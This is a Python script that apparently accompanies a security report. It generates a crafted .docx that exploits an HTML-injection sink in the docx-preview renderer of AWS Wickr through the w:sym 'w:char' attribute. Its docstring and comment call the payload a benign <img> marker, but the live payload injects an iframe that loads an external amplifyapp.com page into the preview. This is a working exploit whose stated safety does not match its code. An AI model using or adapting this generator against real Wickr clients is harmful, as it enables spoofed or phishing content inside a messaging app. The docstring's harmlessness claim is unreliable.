#!/usr/bin/env python3
"""
build_poc_docx.py — builds a BENIGN proof-of-concept .docx demonstrating the
AWS Wickr docx-preview HTML-injection sink (docx-preview renderSymbol:
`t.innerHTML = `&#x${e.char};`` with e.char = w:sym/@w:char, unsanitized).

The payload injects a marker <img> element into the preview DOM (proves HTML
injection). The inline onerror is intentionally benign AND is blocked by the
client's CSP (script-src 'self') — that CSP block is precisely the single
barrier this report is about. No harmful action is performed.

Output: poc-docx-htmli.docx  (next to this script)
"""
import zipfile, os

# Raw payload docx-preview will receive from getAttribute('w:char'):
#   0;<img src=x alt=WICKR-HTMLi-POC onerror="window.__WICKR_HTMLI_POC__=1">
WCHAR_ATTR = WCHAR_ATTR = '0;&lt;iframe src=&quot;https://main.d4zeeqgazhley.amplifyapp.com/&quot; width=&quot;100%&quot; height=&quot;500&quot;&gt;&lt;/iframe&gt;'

CONTENT_TYPES = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

RELS = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''

DOCUMENT = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t xml:space="preserve"> VVTS Wickr docx-preview HTML-injection PoC. The symbol run below injects a marker &lt;img&gt; via w:sym/@w:char.</w:t></w:r></w:p>
    <w:p><w:r><w:sym w:font="Symbol" w:char="{WCHAR_ATTR}"/></w:r></w:p>
    <w:sectPr/>
  </w:body>
</w:document>'''

def main():
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'poc-docx-htmli.docx')
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('[Content_Types].xml', CONTENT_TYPES)
        z.writestr('_rels/.rels', RELS)
        z.writestr('word/document.xml', DOCUMENT)
    print('wrote', out, os.path.getsize(out), 'bytes')

if __name__ == '__main__':
    main()
